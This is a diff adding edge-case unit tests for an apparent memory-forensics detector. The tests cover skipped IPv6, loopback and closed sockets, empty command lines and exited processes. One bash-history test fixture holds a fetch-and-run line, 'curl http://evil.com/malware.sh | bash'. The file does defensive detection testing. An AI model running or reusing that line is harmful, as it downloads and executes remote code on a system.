@@ -809,3 +809,167 @@ def test_linux_sockstat_non_shell_process_does_not_fire() -> None:
 def test_linux_sockstat_listening_state_skipped() -> None:
     row = _linux_netscan_row(state="LISTEN", foreign_addr=None, foreign_port=None)
     assert MemoryDetector().analyze(linux_sockstat=[row]) == []
+
+
+# ============================================================================
+# Memory Detector Edge Cases (Phase 3 coverage improvements)
+# ============================================================================
+
+
+def test_cmdline_no_args_skipped() -> None:
+    """Command line rows with None args should be skipped gracefully."""
+    row = CommandLineRow(pid=1234, process="test.exe", args=None, raw_row={})
+    findings = MemoryDetector().analyze(cmdline=[row])
+    assert len(findings) == 0, "Rows with no args should be skipped"
+
+
+def test_netscan_ipv6_address_skipped() -> None:
+    """IPv6 addresses are skipped until we have proper tuning."""
+    row = _netscan_row(
+        foreign_addr="2001:db8::1",
+        foreign_port=443,
+        owner="powershell.exe",
+        state="ESTABLISHED",
+    )
+    findings = MemoryDetector().analyze(netscan=[row])
+    assert len(findings) == 0, "IPv6 addresses should be skipped"
+
+
+def test_netscan_loopback_address_skipped() -> None:
+    """Loopback connections should not generate findings."""
+    row = _netscan_row(
+        foreign_addr="127.0.0.1",
+        foreign_port=8080,
+        owner="cmd.exe",
+        state="ESTABLISHED",
+    )
+    findings = MemoryDetector().analyze(netscan=[row])
+    assert len(findings) == 0, "Loopback should be skipped"
+
+
+def test_netscan_listening_state_skipped() -> None:
+    """LISTENING sockets have no remote endpoint."""
+    row = _netscan_row(
+        foreign_addr=None,
+        foreign_port=None,
+        owner="svchost.exe",
+        state="LISTENING",
+    )
+    findings = MemoryDetector().analyze(netscan=[row])
+    assert len(findings) == 0
+
+
+def test_netscan_closed_state_skipped() -> None:
+    """CLOSED/CLOSE_WAIT/TIME_WAIT sockets are torn down."""
+    for state in ["CLOSED", "CLOSE_WAIT", "TIME_WAIT", "FIN_WAIT1", "FIN_WAIT2"]:
+        row = _netscan_row(
+            foreign_addr="1.2.3.4",
+            foreign_port=443,
+            owner="powershell.exe",
+            state=state,
+        )
+        findings = MemoryDetector().analyze(netscan=[row])
+        assert len(findings) == 0, f"{state} connections should be skipped"
+
+
+def test_bash_history_command_too_long_skipped() -> None:
+    """Commands exceeding max length are skipped to prevent regex backtracking."""
+    long_cmd = "curl http://evil.com/malware.sh | bash " + "A" * 10000
+    row = BashHistoryRow(
+        pid=1234,
+        process="bash",
+        command=long_cmd,
+        command_time="2024-01-01 00:00:00",
+        raw_row={},
+    )
+    findings = MemoryDetector().analyze(linux_bash=[row])
+    # Should not crash, may or may not fire depending on prefix
+    assert isinstance(findings, list)
+
+
+def test_bash_history_empty_command_skipped() -> None:
+    """Bash history rows with no command are skipped."""
+    row = BashHistoryRow(
+        pid=1234,
+        process="bash",
+        command=None,
+        command_time="2024-01-01 00:00:00",
+        raw_row={},
+    )
+    findings = MemoryDetector().analyze(linux_bash=[row])
+    assert len(findings) == 0
+
+
+def test_linux_sockstat_ipv6_skipped() -> None:
+    """IPv6 addresses in Linux sockstat are skipped."""
+    row = _linux_netscan_row(
+        process="bash",
+        foreign_addr="2001:db8::2",
+        foreign_port=4444,
+        state="ESTABLISHED",
+    )
+    findings = MemoryDetector().analyze(linux_sockstat=[row])
+    assert len(findings) == 0
+
+
+def test_linux_sockstat_loopback_skipped() -> None:
+    """Loopback connections in Linux are skipped."""
+    row = _linux_netscan_row(
+        process="bash",
+        foreign_addr="127.0.0.1",
+        foreign_port=9001,
+        state="ESTABLISHED",
+    )
+    findings = MemoryDetector().analyze(linux_sockstat=[row])
+    assert len(findings) == 0
+
+
+def test_linux_sockstat_closed_states_skipped() -> None:
+    """Closed/torn-down connections are skipped."""
+    for state in ["LISTEN", "CLOSED", "CLOSE_WAIT", "TIME_WAIT"]:
+        row = _linux_netscan_row(
+            process="bash",
+            foreign_addr="1.2.3.4",
+            foreign_port=4444,
+            state=state,
+        )
+        findings = MemoryDetector().analyze(linux_sockstat=[row])
+        assert len(findings) == 0, f"{state} should be skipped"
+
+
+def test_hidden_process_with_exit_time_skipped() -> None:
+    """Process in psscan with exit_time is not a hidden process."""
+    pslist_rows = [_proc(1000, "legit.exe")]
+    psscan_rows = [
+        _proc(1000, "legit.exe"),
+        _proc(2000, "exited.exe", exit_time="2024-01-01T01:00:00"),
+    ]
+    findings = MemoryDetector().analyze(pslist=pslist_rows, psscan=psscan_rows)
+    hidden_findings = [
+        f for f in findings if "Hidden process" in f.title
+    ]
+    assert len(hidden_findings) == 0, "Exited processes should not be flagged"
+
+
+def test_netscan_no_foreign_address_skipped() -> None:
+    """Rows without foreign_addr are skipped."""
+    row = _netscan_row(
+        foreign_addr=None,
+        foreign_port=None,
+        owner="svchost.exe",
+        state="ESTABLISHED",
+    )
+    findings = MemoryDetector().analyze(netscan=[row])
+    assert len(findings) == 0
+
+
+def test_linux_sockstat_no_foreign_address_skipped() -> None:
+    """Linux sockstat rows without foreign_addr are skipped."""
+    row = _linux_netscan_row(
+        process="bash",
+        foreign_addr=None,
+        foreign_port=None,
+        state="ESTABLISHED",
+    )
+    findings = MemoryDetector().analyze(linux_sockstat=[row])
+    assert len(findings) == 0
